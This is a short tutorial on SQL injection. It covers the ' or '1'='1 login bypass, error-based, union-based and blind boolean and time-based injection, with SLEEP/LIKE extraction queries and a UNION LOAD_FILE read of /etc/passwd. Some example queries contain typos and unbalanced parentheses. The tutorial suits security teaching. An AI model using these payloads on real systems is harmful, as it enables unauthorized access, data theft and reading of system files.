SQL Injection is an injection attack in which attacker attempts to modify ( or inject his own query ) in the website where the website is attempting to get some result from a database.

If you simply want to bypass the login you can enter query in this way : 
```
' or '1'='1
```
This will always return a true value thus bypassing the login page (if it is vulnerable to it).

There are many types of SQL Injections

#### Error based injection 
In this type of injection attacker try to put any character which generates an error in the result of query and understand the structure of the query to further exploit it.

You can generate an error by simply putting a single quote ' in the query.

```
select id from login where username=''' and password='';
```

This will generate an error in the query.

#### Union based injection

**UNION** is a sql keyword which combines 2 select statements.
```
select 1,2 union select 3,4;
```
Note - no. of fields (columns) must be same in both select statements

So in this type of injection attacker tries select other database information and display it with the website information using union

#### Blind sql injection
In blind sql injection, you don't get any result display. It just shows whether the query is returning true or false.
There are further types in blind sqli - boolean based and time based sqli

#### Boolean-Based SQL Injection

In boolean based sqli, attacker asks question to database in such a way that he/she will be able to figure out what the data is.
See more in time based sqli


#### Time-Based SQL Injection

Before understanding this you need to be familiar with : **SLEEP()** and **LIKE**

In sql, **SLEEP(n)** will suspend the query for n seconds.
For Example - 
```
SELECT sleep(2);
```
This query will hold prompt for 2 seconds and then return the result

**LIKE** is a keyword in sql which is used for searchind wildcards.
For example - select id from users where pass like 'pass';
inside '' we can enter '%' - means any character or '\_' - means 1 single character

So with this know now we can perform time-based sqli

Suppose a website is running this query in the backend :
```
select id from login where user='' and password='';
```

Now let's apply time based sqli in this 
```
select id from login where user='admin' and (select sleep(2) from dual where database() like '____';-- 
```

If the database name is 4 character long then there will be a time delay. Now you can ask it questions in such a way that you can get any information from database.
```
select id from login where user='admin' and (select sleep(2) from dual where (select table_name from information_schema.tables where table_schema='login') likee '%users%');-- 

```

##### If you want to include a file then there is LOAD\_FILE('path') function in sql 
```
select id from login where username='' union select LOAD_FILE('/etc/passwd');-- 
```
